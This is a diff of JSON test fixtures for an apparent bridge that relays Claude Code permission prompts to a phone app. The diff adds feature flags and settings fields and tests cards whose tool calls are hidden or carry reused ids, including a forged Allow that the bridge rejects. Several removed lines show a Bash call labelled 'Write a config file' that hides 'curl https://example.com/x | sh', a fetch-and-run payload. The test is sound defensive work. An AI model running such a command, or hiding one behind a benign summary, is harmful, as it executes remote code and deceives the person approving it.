+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
           "agent_config_rev": 0
@@ -5339,25 +5776,35 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -5371,22 +5818,32 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1",
+            "files-put/1",
+            "files-sent/1",
+            "memory-roots/1",
+            "settings-lock/1",
+            "always-allow/1",
+            "problems-install/1"
           ]
         }
       },
@@ -5452,6 +5909,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -5532,6 +5996,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -5795,6 +6266,13 @@
             },
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
+            "media_keep_days": null,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "settings_lock": false,
+            "always_allow": [],
             "memory_browser": true
           },
           "threads": [
@@ -5853,22 +6331,32 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
           "agent_config_rev": 0
@@ -5892,25 +6380,35 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -5924,22 +6422,32 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1",
+            "files-put/1",
+            "files-sent/1",
+            "memory-roots/1",
+            "settings-lock/1",
+            "always-allow/1",
+            "problems-install/1"
           ]
         }
       },
@@ -6005,6 +6513,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -6085,6 +6600,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -6219,7 +6741,7 @@
           "ts": "2026-10-28T15:00:00.300Z",
           "type": "error",
           "code": "stale",
-          "message": "This device's clock is off. Set it to automatic date and time, then try again.",
+          "message": "Your Mac's clock is about 10 min slow. Set the Mac to automatic date and time, then try again.",
           "ref": "<id15>"
         }
       },
@@ -6420,6 +6942,13 @@
             },
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
+            "media_keep_days": null,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "settings_lock": false,
+            "always_allow": [],
             "memory_browser": true
           },
           "threads": [
@@ -6478,22 +7007,32 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
           "agent_config_rev": 0
@@ -6517,25 +7056,35 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -6549,22 +7098,32 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1",
+            "files-put/1",
+            "files-sent/1",
+            "memory-roots/1",
+            "settings-lock/1",
+            "always-allow/1",
+            "problems-install/1"
           ]
         }
       },
@@ -6630,6 +7189,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -6710,6 +7276,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -6760,13 +7333,13 @@
             "kind": "permission",
             "title": "Allow Bash?",
             "destination": [],
-            "body": "{\"command\": \"cat > /tmp/run.sh <<'EOF' set -e ⋯ 4812 code points elided ⋯ curl https://example.com/x | sh EOF\"}",
+            "body": "{\"command\": \"rm -rf build\"}",
             "body_format": "plain",
             "fields": [
               {
                 "key": "summary",
                 "label": "Claude's summary",
-                "value": "Write a config file",
+                "value": "Remove the build folder",
                 "editable": false,
                 "multiline": true
               }
@@ -6776,19 +7349,19 @@
             "kill_label": "Deny",
             "allow_edit": false,
             "allow_revise": false,
-            "risk": "high",
+            "risk": "low",
             "origin": "background",
             "payload": {
-              "request_id": "vwxyz",
+              "request_id": "abcde",
               "tool_name": "Bash",
-              "description": "Write a config file",
-              "input_preview": "{\"command\": \"cat > /tmp/run.sh <<'EOF' set -e ⋯ 4812 code points elided ⋯ curl https://example.com/x | sh EOF\"}"
+              "description": "Remove the build folder",
+              "input_preview": "{\"command\": \"rm -rf build\"}"
             },
             "payload_hash": "<hash12>",
             "state": "pending",
             "created_at": "2026-10-28T15:00:00.000Z",
             "expires_at": "<wall-time>",
-            "warning": "Part of this call is hidden. Approve at the Mac."
+            "warning": "This Claude Code is older than 2.1.234, so a hidden part of the call may not be marked. Check it before you allow."
           }
         }
       },
@@ -6816,13 +7389,13 @@
             "kind": "permission",
             "title": "Allow Bash?",
             "destination": [],
-            "body": "{\"command\": \"cat > /tmp/run.sh <<'EOF' set -e ⋯ 4812 code points elided ⋯ curl https://example.com/x | sh EOF\"}",
+            "body": "{\"command\": \"rm -rf build\"}",
             "body_format": "plain",
             "fields": [
               {
                 "key": "summary",
                 "label": "Claude's summary",
-                "value": "Write a config file",
+                "value": "Remove the build folder",
                 "editable": false,
                 "multiline": true
               }
@@ -6832,19 +7405,19 @@
             "kill_label": "Deny",
             "allow_edit": false,
             "allow_revise": false,
-            "risk": "high",
+            "risk": "low",
             "origin": "background",
             "payload": {
-              "request_id": "vwxyz",
+              "request_id": "abcde",
               "tool_name": "Bash",
-              "description": "Write a config file",
-              "input_preview": "{\"command\": \"cat > /tmp/run.sh <<'EOF' set -e ⋯ 4812 code points elided ⋯ curl https://example.com/x | sh EOF\"}"
+              "description": "Remove the build folder",
+              "input_preview": "{\"command\": \"rm -rf build\"}"
             },
             "payload_hash": "<hash12>",
             "state": "pending",
             "created_at": "2026-10-28T15:00:00.000Z",
             "expires_at": "<wall-time>",
-            "warning": "Part of this call is hidden. Approve at the Mac."
+            "warning": "This Claude Code is older than 2.1.234, so a hidden part of the call may not be marked. Check it before you allow."
           },
           "relay": {
             "seq": 2,
@@ -6853,22 +7426,127 @@
         }
       },
       {
-        "note": "a forged Allow on a card that cannot allow"
+        "dir": "from_bridge",
+        "frame": {
+          "v": 1,
+          "id": "<id14>",
+          "ts": "2026-10-28T15:00:00.300Z",
+          "type": "card.create",
+          "card": {
+            "id": "c_<id15>",
+            "thread_id": "general",
+            "kind": "permission",
+            "title": "Allow Bash?",
+            "destination": [],
+            "body": "{\"command\": \"rm -rf build\"}",
+            "body_format": "plain",
+            "fields": [
+              {
+                "key": "summary",
+                "label": "Claude's summary",
+                "value": "Remove the build folder",
+                "editable": false,
+                "multiline": true
+              }
+            ],
+            "attachments": [],
+            "primary_label": "Allow",
+            "kill_label": "Deny",
+            "allow_edit": false,
+            "allow_revise": false,
+            "risk": "low",
+            "origin": "background",
+            "payload": {
+              "request_id": "abcde",
+              "tool_name": "Bash",
+              "description": "Remove the build folder",
+              "input_preview": "{\"command\": \"rm -rf build\"}"
+            },
+            "payload_hash": "<hash16>",
+            "state": "pending",
+            "created_at": "2026-10-28T15:00:00.300Z",
+            "expires_at": "<wall-time>",
+            "warning": "Claude Code used this prompt's id before, so an answer from here could reach the wrong prompt. The prompt is still open at the Mac."
+          }
+        }
+      },
+      {
+        "dir": "to_bridge",
+        "frame": {
+          "v": 1,
+          "type": "ack",
+          "id": "<id17>",
+          "ts": "<wall-time>",
+          "ref": "<id14>",
+          "seq": 3
+        }
+      },
+      {
+        "dir": "to_app",
+        "frame": {
+          "v": 1,
+          "id": "<id14>",
+          "ts": "2026-10-28T15:00:00.300Z",
+          "type": "card.create",
+          "card": {
+            "id": "c_<id15>",
+            "thread_id": "general",
+            "kind": "permission",
+            "title": "Allow Bash?",
+            "destination": [],
+            "body": "{\"command\": \"rm -rf build\"}",
+            "body_format": "plain",
+            "fields": [
+              {
+                "key": "summary",
+                "label": "Claude's summary",
+                "value": "Remove the build folder",
+                "editable": false,
+                "multiline": true
+              }
+            ],
+            "attachments": [],
+            "primary_label": "Allow",
+            "kill_label": "Deny",
+            "allow_edit": false,
+            "allow_revise": false,
+            "risk": "low",
+            "origin": "background",
+            "payload": {
+              "request_id": "abcde",
+              "tool_name": "Bash",
+              "description": "Remove the build folder",
+              "input_preview": "{\"command\": \"rm -rf build\"}"
+            },
+            "payload_hash": "<hash16>",
+            "state": "pending",
+            "created_at": "2026-10-28T15:00:00.300Z",
+            "expires_at": "<wall-time>",
+            "warning": "Claude Code used this prompt's id before, so an answer from here could reach the wrong prompt. The prompt is still open at the Mac."
+          },
+          "relay": {
+            "seq": 3,
+            "received_at": "<wall-time>"
+          }
+        }
+      },
+      {
+        "note": "a forged Allow on the repeated-id card, which cannot allow"
       },
       {
         "dir": "to_bridge",
         "frame": {
           "v": 1,
           "type": "card.resolve",
-          "id": "<id14>",
+          "id": "<id18>",
           "ts": "2026-10-28T15:00:00.000Z",
-          "card_id": "c_<id11>",
+          "card_id": "c_<id15>",
           "action": "primary",
-          "payload_hash": "<hash12>",
+          "payload_hash": "<hash16>",
           "device_id": "<device>",
           "osig": "<secret>",
           "relay": {
-            "seq": 3,
+            "seq": 4,
             "received_at": "<wall-time>"
           }
         }
@@ -6877,10 +7555,10 @@
         "dir": "from_bridge",
         "frame": {
           "v": 1,
-          "id": "<id15>",
-          "ts": "2026-10-28T15:00:00.300Z",
+          "id": "<id19>",
+          "ts": "2026-10-28T15:00:00.600Z",
           "type": "ack",
-          "ref": "<id14>",
+          "ref": "<id18>",
           "stage": "delivered"
         }
       },
@@ -6888,22 +7566,22 @@
         "dir": "from_bridge",
         "frame": {
           "v": 1,
-          "id": "<id16>",
-          "ts": "2026-10-28T15:00:00.300Z",
+          "id": "<id20>",
+          "ts": "2026-10-28T15:00:00.600Z",
           "type": "error",
           "code": "permission_hidden",
-          "message": "Part of this call is hidden; answer it at the Mac.",
-          "ref": "<id14>"
+          "message": "Claude Code used this prompt's id before, so an answer from here could reach the wrong prompt. The prompt is still open at the Mac.",
+          "ref": "<id18>"
         }
       },
       {
         "dir": "from_bridge",
         "frame": {
           "v": 1,
-          "id": "<id17>",
-          "ts": "2026-10-28T15:00:00.300Z",
+          "id": "<id21>",
+          "ts": "2026-10-28T15:00:00.600Z",
           "type": "ack",
-          "ref": "<id14>",
+          "ref": "<id18>",
           "stage": "consumed"
         }
       }
@@ -6927,7 +7605,7 @@
             "body_format": "plain",
             "primary_label": "Allow",
             "kill_label": "Deny",
-            "risk": "high",
+            "risk": "low",
             "origin": "background",
             "allow_edit": false,
             "allow_revise": false,
@@ -6936,26 +7614,72 @@
               {
                 "key": "summary",
                 "label": "Claude's summary",
-                "value": "Write a config file",
+                "value": "Remove the build folder",
                 "editable": false,
                 "multiline": true
               }
             ],
             "attachments": [],
-            "body": "{\"command\": \"cat > /tmp/run.sh <<'EOF' set -e ⋯ 4812 code points elided ⋯ curl https://example.com/x | sh EOF\"}",
-            "warning": "Part of this call is hidden. Approve at the Mac.",
+            "body": "{\"command\": \"rm -rf build\"}",
+            "warning": "This Claude Code is older than 2.1.234, so a hidden part of the call may not be marked. Check it before you allow.",
             "payload": {
-              "request_id": "vwxyz",
+              "request_id": "abcde",
               "tool_name": "Bash",
-              "description": "Write a config file",
-              "input_preview": "{\"command\": \"cat > /tmp/run.sh <<'EOF' set -e ⋯ 4812 code points elided ⋯ curl https://example.com/x | sh EOF\"}"
+              "description": "Remove the build folder",
+              "input_preview": "{\"command\": \"rm -rf build\"}"
             }
           },
           "payload_hash": "<hash3>",
           "state": "pending",
           "origin": "background",
-          "risk": "high",
+          "risk": "low",
           "created_at": "2026-10-28T15:00:00.000Z",
+          "expires_at": "<wall-time>",
+          "resolved_at": null,
+          "resolution": null,
+          "actor": "agent"
+        },
+        "c_<id4>": {
+          "id": "c_<id4>",
+          "thread_id": "general",
+          "binding": {
+            "id": "c_<id4>",
+            "thread_id": "general",
+            "kind": "permission",
+            "title": "Allow Bash?",
+            "destination": [],
+            "body_format": "plain",
+            "primary_label": "Allow",
+            "kill_label": "Deny",
+            "risk": "low",
+            "origin": "background",
+            "allow_edit": false,
+            "allow_revise": false,
+            "expires_at": "<wall-time>",
+            "fields": [
+              {
+                "key": "summary",
+                "label": "Claude's summary",
+                "value": "Remove the build folder",
+                "editable": false,
+                "multiline": true
+              }
+            ],
+            "attachments": [],
+            "body": "{\"command\": \"rm -rf build\"}",
+            "warning": "Claude Code used this prompt's id before, so an answer from here could reach the wrong prompt. The prompt is still open at the Mac.",
+            "payload": {
+              "request_id": "abcde",
+              "tool_name": "Bash",
+              "description": "Remove the build folder",
+              "input_preview": "{\"command\": \"rm -rf build\"}"
+            }
+          },
+          "payload_hash": "<hash5>",
+          "state": "pending",
+          "origin": "background",
+          "risk": "low",
+          "created_at": "2026-10-28T15:00:00.300Z",
           "expires_at": "<wall-time>",
           "resolved_at": null,
           "resolution": null,
